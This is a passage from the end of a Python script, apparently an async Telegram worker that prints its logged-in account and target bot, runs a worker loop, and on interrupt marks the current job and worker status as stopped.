        or getattr(me, "first_name", "unknown")
    )

    print(
        "Logged in as:",
        username,
    )

    print(
        "Listening to:",
        BOT_USERNAME,
    )

    await worker_loop()


# ============================================================
# RUN
# ============================================================

if __name__ == "__main__":

    try:

        asyncio.run(
            main()
        )

    except KeyboardInterrupt:

        print()
        print(
            "Worker stopped."
        )

        try:

            if current_job:

                update_job_status(
                    current_job,
                    "stopped",
                )

                sync_worker_status_all(
                    "stopped",
                    current_job,
                )

        except Exception:

            pass